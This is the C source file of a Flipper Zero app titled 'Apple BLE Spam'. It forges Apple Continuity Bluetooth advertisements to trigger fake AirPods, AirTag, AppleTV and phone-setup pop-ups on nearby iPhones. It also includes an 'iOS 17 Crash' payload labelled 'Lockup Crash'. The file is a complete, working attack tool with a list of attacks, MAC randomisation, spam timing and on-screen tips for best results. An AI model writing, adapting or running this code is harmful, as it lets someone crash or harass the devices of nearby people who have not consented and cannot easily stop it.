#include <furi.h>
#include <gui/gui.h>
#include <gui/elements.h>
#include <furi_hal_bt.h>
#include <stdint.h>
#include <furi_hal_random.h>
#include <extra_beacon.h>
#include "apple_ble_spam_icons.h"
#include "lib/_protocols.h"
#include "lib/continuity.h"

// Continuity functions (included directly)
const char* continuity_get_type_name(ContinuityType type) {
    switch(type) {
        case ContinuityTypeAirDrop: return "AirDrop";
        case ContinuityTypeProximityPair: return "ProximityPair";
        case ContinuityTypeAirplayTarget: return "AirplayTarget";
        case ContinuityTypeHandoff: return "Handoff";
        case ContinuityTypeTetheringSource: return "TetheringSource";
        case ContinuityTypeNearbyAction: return "NearbyAction";
        case ContinuityTypeNearbyInfo: return "NearbyInfo";
        case ContinuityTypeCustomCrash: return "CustomCrash";
        default: return "Unknown";
    }
}

// Working packet generation from the functional version
static void make_continuity_packet(uint8_t* _size, uint8_t** _packet, Payload* payload) {
    ContinuityCfg* cfg = payload ? &payload->continuity : NULL;

    ContinuityType type;
    if(cfg && cfg->type != 0x00) {
        type = cfg->type;
    } else {
        const ContinuityType types[] = {
            ContinuityTypeProximityPair,
            ContinuityTypeNearbyAction,
            ContinuityTypeCustomCrash,
        };
        type = types[rand() % COUNT_OF(types)];
    }

    uint8_t size = 27; // Standard size for most types
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    packet[i++] = size - 1; // Size
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0x4C; // Company ID (Apple, Inc.)
    packet[i++] = 0x00; // ...
    packet[i++] = type; // Continuity Type
    packet[i] = size - i - 1; // Continuity Size
    i++;

    switch(type) {
    case ContinuityTypeProximityPair: {
        uint16_t model;
        uint8_t color;
        switch(payload ? payload->mode : PayloadModeRandom) {
        case PayloadModeRandom:
        default: {
            // Random AirPods model
            const uint16_t models[] = {0x0E20, 0x0220, 0x0055, 0x0A20};
            model = models[rand() % COUNT_OF(models)];
            color = 0x00; // White
            break;
        }
        case PayloadModeValue:
            model = cfg->data.proximity_pair.model;
            color = cfg->data.proximity_pair.color;
            break;
        case PayloadModeBruteforce:
            model = cfg->data.proximity_pair.model = payload->bruteforce.value;
            color = cfg->data.proximity_pair.color;
            break;
        }

        uint8_t prefix;
        if(cfg && cfg->data.proximity_pair.prefix != 0x00) {
            prefix = cfg->data.proximity_pair.prefix;
        } else {
            if(model == 0x0055)
                prefix = 0x05;
            else
                prefix = 0x01;
        }

        packet[i++] = prefix; // Prefix
        packet[i++] = (model >> 0x08) & 0xFF; // Device Model
        packet[i++] = (model >> 0x00) & 0xFF; // ...
        packet[i++] = 0x55; // Status
        packet[i++] = ((rand() % 10) << 4) + (rand() % 10); // Buds Battery Level
        packet[i++] = ((rand() % 8) << 4) + (rand() % 10); // Charging Status and Battery Case Level
        packet[i++] = (rand() % 256); // Lid Open Counter
        packet[i++] = color; // Device Color
        packet[i++] = 0x00;
        furi_hal_random_fill_buf(&packet[i], 16); // Encrypted Payload
        i += 16;
        break;
    }

    case ContinuityTypeNearbyAction: {
        uint8_t action;
        switch(payload ? payload->mode : PayloadModeRandom) {
        case PayloadModeRandom:
        default:
            // Random nearby actions
            const uint8_t actions[] = {0x13, 0x27, 0x20, 0x09, 0x02, 0x0B};
            action = actions[rand() % COUNT_OF(actions)];
            break;
        case PayloadModeValue:
            action = cfg->data.nearby_action.action;
            break;
        case PayloadModeBruteforce:
            action = cfg->data.nearby_action.action = payload->bruteforce.value;
            break;
        }

        uint8_t flags;
        if(cfg && cfg->data.nearby_action.flags != 0x00) {
            flags = cfg->data.nearby_action.flags;
        } else {
            flags = 0xC0;
            if(action == 0x20 && rand() % 2) flags--; // More spam for 'Join This AppleTV?'
            if(action == 0x09 && rand() % 2) flags = 0x40; // Glitched 'Setup New Device'
        }

        packet[i++] = flags; // Action Flags
        packet[i++] = action; // Action Type
        furi_hal_random_fill_buf(&packet[i], 3); // Authentication Tag
        i += 3;
        break;
    }

    case ContinuityTypeCustomCrash: {
        // iOS 17 Crash payload
        uint8_t action = 0x20; // Join This AppleTV?
        uint8_t flags = 0xC0;

        i -= 2; // Override segment header
        packet[i++] = ContinuityTypeNearbyAction; // Continuity Type
        packet[i++] = 5; // Continuity Size
        packet[i++] = flags; // Action Flags
        packet[i++] = action; // Action Type
        furi_hal_random_fill_buf(&packet[i], 3); // Authentication Tag
        i += 3;

        packet[i++] = 0x00; // Additional Action Data Terminator
        packet[i++] = 0x00; // ...

        packet[i++] = ContinuityTypeNearbyInfo; // Continuity Type
        furi_hal_random_fill_buf(&packet[i], 3); // Continuity Size + Shenanigans
        i += 3;
        break;
    }

    default:
        // Fill remaining bytes with zeros
        for(int j = i; j < size; j++) {
            packet[j] = 0x00;
        }
        break;
    }

    *_size = size;
    *_packet = packet;
}

// Protocol implementation for Apple Continuity
static const char* continuity_get_name(void* payload) {
    Payload* p = (Payload*)payload;
    return continuity_get_type_name(p->continuity.type);
}

// Apple Continuity protocol definition
const Protocol protocol_continuity = {
    .name = "Apple Continuity",
    .make_packet = (ProtocolMakePacket)make_continuity_packet,
    .get_name = continuity_get_name,
};

// Payload definitions for different Apple BLE spam types
static Attack attacks[] = {
    {.title = "Lockup Crash",
     .text = "iOS 17, locked, long range",
     .payload = {
         .random_mac = false,
         .mode = PayloadModeValue,
         .continuity = {
             .type = ContinuityTypeCustomCrash,
         },
     }},
    {.title = "Random Action",
     .text = "Spam shuffle Nearby Actions",
     .payload = {
         .random_mac = true,
         .mode = PayloadModeRandom,
         .continuity = {
             .type = ContinuityTypeNearbyAction,
         },
     }},
    {.title = "Random Pair",
     .text = "Spam shuffle Proximity Pairs",
     .payload = {
         .random_mac = true,
         .mode = PayloadModeRandom,
         .continuity = {
             .type = ContinuityTypeProximityPair,
         },
     }},
    {.title = "AppleTV AutoFill",
     .text = "Banner, unlocked, long range",
     .payload = {
         .random_mac = false,
         .mode = PayloadModeValue,
         .continuity = {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action = 0x13}},
         },
     }},
    {.title = "AppleTV Connecting...",
     .text = "Modal, unlocked, long range",
     .payload = {
         .random_mac = false,
         .mode = PayloadModeValue,
         .continuity = {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action = 0x27}},
         },
     }},
    {.title = "Join This AppleTV?",
     .text = "Modal, unlocked, spammy",
     .payload = {
         .random_mac = false,
         .mode = PayloadModeValue,
         .continuity = {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action = 0x20}},
         },
     }},
    {.title = "Transfer Phone Number",
     .text = "Modal, locked",
     .payload = {
         .random_mac = false,
         .mode = PayloadModeValue,
         .continuity = {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action = 0x02}},
         },
     }},
    {.title = "Setup New iPhone",
     .text = "Modal, locked",
     .payload = {
         .random_mac = false,
         .mode = PayloadModeValue,
         .continuity = {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action = 0x09}},
         },
     }},
    {.title = "Airtag",
     .text = "Modal, unlocked",
     .payload = {
         .random_mac = false,
         .mode = PayloadModeValue,
         .continuity = {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.model = 0x0055, .color = 0x00, .prefix = 0x05}},
         },
     }},
    {.title = "AirPods Pro",
     .text = "Modal, spammy (auto close)",
     .payload = {
         .random_mac = false,
         .mode = PayloadModeValue,
         .continuity = {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.model = 0x0E20, .color = 0x00, .prefix = 0x01}},
         },
     }},
    {.title = "AirPods",
     .text = "Modal, spammy (auto close)",
     .payload = {
         .random_mac = false,
         .mode = PayloadModeValue,
         .continuity = {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.model = 0x0220, .color = 0x00, .prefix = 0x01}},
         },
     }},
};

#define ATTACKS_COUNT ((signed)COUNT_OF(attacks))

static uint16_t delays[] = {20, 50, 100, 150, 200, 300, 400, 500, 750, 1000, 1500, 2000, 2500, 3000, 4000, 5000};

typedef struct {
    bool resume;
    bool advertising;
    uint8_t delay;
    uint8_t size;
    uint8_t* packet;
    Attack* attack;
    FuriTimer* timer;
    uint8_t mac[6];
    int8_t index;
    FuriString* status_text;
    GapExtraBeaconConfig config;
} State;

// Working BLE implementation using extra_beacon API
static void start_extra_beacon(State* state) {
    uint8_t size;
    uint8_t* packet;
    uint16_t delay = delays[state->delay];
    GapExtraBeaconConfig* config = &state->config;
    Payload* payload = &state->attack->payload;

    config->min_adv_interval_ms = delay;
    config->max_adv_interval_ms = delay * 1.5;
    if(payload->random_mac) {
        furi_hal_random_fill_buf(config->address, sizeof(config->address));
    }
    furi_check(furi_hal_bt_extra_beacon_set_config(config));

    make_continuity_packet(&size, &packet, payload);
    furi_check(furi_hal_bt_extra_beacon_set_data(packet, size));
    free(packet);

    furi_check(furi_hal_bt_extra_beacon_start());
}

static void adv_timer_callback(void* ctx) {
    State* state = ctx;
    if(!state->advertising) return;
    
    // Stop previous beacon if active
    if(furi_hal_bt_extra_beacon_is_active()) {
        furi_check(furi_hal_bt_extra_beacon_stop());
    }
    
    // Start new beacon
    start_extra_beacon(state);
    
    // Update status
    furi_string_printf(state->status_text, "Sent: %s", 
                      continuity_get_type_name(state->attack->payload.continuity.type));
    
    // Restart timer
    furi_timer_start(state->timer, delays[state->delay]);
}

static void stop_adv(State* state) {
    if(!state->advertising) return;
    
    state->advertising = false;
    furi_timer_stop(state->timer);
    
    if(furi_hal_bt_extra_beacon_is_active()) {
        furi_check(furi_hal_bt_extra_beacon_stop());
    }
    
    if(state->resume) {
        furi_hal_bt_start_advertising();
    }
    
    furi_string_set(state->status_text, "Stopped");
    
    state->attack = NULL;
    state->size = 0;
}

static void start_adv(State* state) {
    if(state->advertising) return;
    
    state->advertising = true;
    
    // Initialize extra beacon config
    state->config.adv_channel_map = GapAdvChannelMapAll;
    state->config.adv_power_level = GapAdvPowerLevel_6dBm;
    state->config.address_type = GapAddressTypePublic;
    
    // Remember if BLE was active
    state->resume = furi_hal_bt_is_active();
    
    // Stop normal BLE advertising
    furi_hal_bt_stop_advertising();
    
    // Start our timer
    furi_timer_start(state->timer, delays[state->delay]);
    
    furi_string_printf(state->status_text, "Started: %s", 
                      state->attack->title);
}

static void toggle_adv(State* state, Attack* attack) {
    if(state->advertising) {
        stop_adv(state);
    } else {
        state->attack = attack;
        start_adv(state);
    }
}

#define PAGE_MIN (-5)
#define PAGE_MAX ATTACKS_COUNT
enum {
    PageApps = PAGE_MIN,
    PageDelay,
    PageDistance,
    PageProximityPair,
    PageNearbyAction,
    PageStart = 0,
    PageEnd = ATTACKS_COUNT - 1,
    PageAbout = PAGE_MAX,
};

static void draw_callback(Canvas* canvas, void* ctx) {
    State* state = ctx;
    const char* back = "Back";
    const char* next = "Next";
    switch(state->index) {
    case PageStart - 1:
        next = "Spam";
        break;
    case PageStart:
        back = "Help";
        break;
    case PageEnd:
        next = "About";
        break;
    case PageEnd + 1:
        back = "Spam";
        break;
    }

    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 14, 12, "Apple BLE Spam");

    switch(state->index) {
    case PageApps:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Some Apps\e# interfere\n"
            "with the attacks, stay on\n"
            "homescreen for best results",
            false);
        break;
    case PageDelay:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Delay\e# is time between\n"
            "attack attempts (top right),\n"
            "keep 20ms for best results",
            false);
        break;
    case PageDistance:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Distance\e# is limited, attacks\n"
            "work under 1 meter but a\n"
            "few are marked 'long range'",
            false);
        break;
    case PageProximityPair:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Proximity Pair\e# attacks\n"
            "keep spamming but work at\n"
            "very close range",
            false);
        break;
    case PageNearbyAction:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Nearby Actions\e# work one\n"
            "time then need to lock and\n"
            "unlock the phone",
            false);
        break;
    case PageAbout:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "About");
        elements_text_box(
            canvas,
            4,
            16,
            122,
            48,
            AlignLeft,
            AlignTop,
            "App+Spam by \e#WillyJL\e# XFW\n"
            "IDs and Crash by \e#ECTO-1A\e#\n"
            "Continuity by \e#furiousMAC\e#\n"
            "                                   Version \e#1.2\e#",
            false);
        break;
    default: {
        if(state->index < 0 || state->index > ATTACKS_COUNT - 1) break;
        const Attack* attack = &attacks[state->index];
        char str[32];

        canvas_set_font(canvas, FontPrimary);
        snprintf(str, sizeof(str), "%ims", delays[state->delay]);
        canvas_draw_str_aligned(canvas, 116, 12, AlignRight, AlignBottom, str);
        canvas_draw_str(canvas, 119, 6, "^");
        canvas_draw_str(canvas, 119, 10, "v");

        canvas_set_font(canvas, FontPrimary);
        snprintf(
            str,
            sizeof(str),
            "%02i/%02i: %s",
            state->index + 1,
            ATTACKS_COUNT,
            continuity_get_type_name(attack->payload.continuity.type));
        canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 24, str);

        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 4, 34, attack->title);

        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 4, 46, attack->text);

        // Show status
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 4, 58, furi_string_get_cstr(state->status_text));

        elements_button_center(canvas, state->advertising ? "Stop" : "Start");
        break;
    }
    }

    if(state->index > PAGE_MIN) {
        elements_button_left(canvas, back);
    }
    if(state->index < PAGE_MAX) {
        elements_button_right(canvas, next);
    }
}

static void input_callback(InputEvent* input, void* ctx) {
    FuriMessageQueue* input_queue = ctx;
    if(input->type == InputTypeShort || input->type == InputTypeLong ||
       input->type == InputTypeRepeat) {
        furi_message_queue_put(input_queue, input, 0);
    }
}

int32_t apple_ble_spam_app(void* p) {
    UNUSED(p);
    
    // Save previous BLE state
    GapExtraBeaconConfig prev_cfg;
    const GapExtraBeaconConfig* prev_cfg_ptr = furi_hal_bt_extra_beacon_get_config();
    if(prev_cfg_ptr) {
        memcpy(&prev_cfg, prev_cfg_ptr, sizeof(prev_cfg));
    }
    uint8_t prev_data[EXTRA_BEACON_MAX_DATA_SIZE];
    uint8_t prev_data_len = furi_hal_bt_extra_beacon_get_data(prev_data);
    bool prev_active = furi_hal_bt_extra_beacon_is_active();

    State* state = malloc(sizeof(State));
    memset(state, 0, sizeof(State));
    
    // Initialize timer
    state->timer = furi_timer_alloc(adv_timer_callback, FuriTimerTypePeriodic, state);
    
    // Initialize status text
    state->status_text = furi_string_alloc();
    furi_string_set(state->status_text, "Ready");

    FuriMessageQueue* input_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
    ViewPort* view_port = view_port_alloc();
    Gui* gui = furi_record_open(RECORD_GUI);
    view_port_input_callback_set(view_port, input_callback, input_queue);
    view_port_draw_callback_set(view_port, draw_callback, state);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    bool running = true;
    
    while(running) {
        InputEvent input;
        furi_check(furi_message_queue_get(input_queue, &input, FuriWaitForever) == FuriStatusOk);

        Attack* attack = (state->index >= 0 && state->index <= ATTACKS_COUNT - 1) ?
                               &attacks[state->index] :
                               NULL;
        bool advertising = state->advertising;
        switch(input.key) {
        case InputKeyOk:
            if(attack) toggle_adv(state, attack);
            break;
        case InputKeyUp:
            if(attack && state->delay < COUNT_OF(delays) - 1) {
                if(advertising) stop_adv(state);
                state->delay++;
                if(advertising) start_adv(state);
            }
            break;
        case InputKeyDown:
            if(attack && state->delay > 0) {
                if(advertising) stop_adv(state);
                state->delay--;
                if(advertising) start_adv(state);
                }
            break;
        case InputKeyLeft:
            if(state->index > PAGE_MIN) {
                if(advertising) toggle_adv(state, attack);
                state->index--;
            }
            break;
        case InputKeyRight:
            if(state->index < PAGE_MAX) {
                if(advertising) toggle_adv(state, attack);
                state->index++;
            }
            break;
        case InputKeyBack:
            if(advertising) toggle_adv(state, attack);
            running = false;
            break;
        default:
            continue;
        }

        view_port_update(view_port);
    }

    gui_remove_view_port(gui, view_port);
    furi_record_close(RECORD_GUI);
    view_port_free(view_port);
    furi_message_queue_free(input_queue);

    // Cleanup
    furi_timer_free(state->timer);
    furi_string_free(state->status_text);
    free(state);

    // Restore previous BLE state
    if(furi_hal_bt_extra_beacon_is_active()) {
        furi_check(furi_hal_bt_extra_beacon_stop());
    }
    if(prev_cfg_ptr) {
        furi_check(furi_hal_bt_extra_beacon_set_config(&prev_cfg));
    }
    furi_check(furi_hal_bt_extra_beacon_set_data(prev_data, prev_data_len));
    if(prev_active) {
        furi_check(furi_hal_bt_extra_beacon_start());
    }

    return 0;
}
